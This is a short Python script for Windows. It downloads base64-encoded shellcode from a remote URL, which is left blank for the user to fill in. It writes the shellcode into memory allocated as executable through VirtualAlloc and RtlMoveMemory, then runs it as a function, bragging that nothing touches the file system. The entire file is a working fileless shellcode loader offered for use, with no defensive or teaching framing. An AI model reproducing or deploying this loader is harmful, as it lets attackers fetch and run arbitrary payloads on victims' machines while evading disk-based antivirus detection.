'''
This script is capable of executing raw shell code without touching the file system.
'''
# Import needed packages
from urllib import request  # Use urllib for grabbing remote shellcode in Base64 format

import base64  # Used for decoding the shellcode
import ctypes  # Interact with C/C++

kernel32 = ctypes.windll.kernel32  # Get windows kernel


def get_code(url):
    '''
    Get and return the remote shellcode.
    '''
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode


def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    '''
    Run the shellcode we got.
    '''
    buf = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()


if __name__ == '__main__':
    url = ""  # The URL of your shellcode
    shellcode = get_code(url)
    run(shellcode)
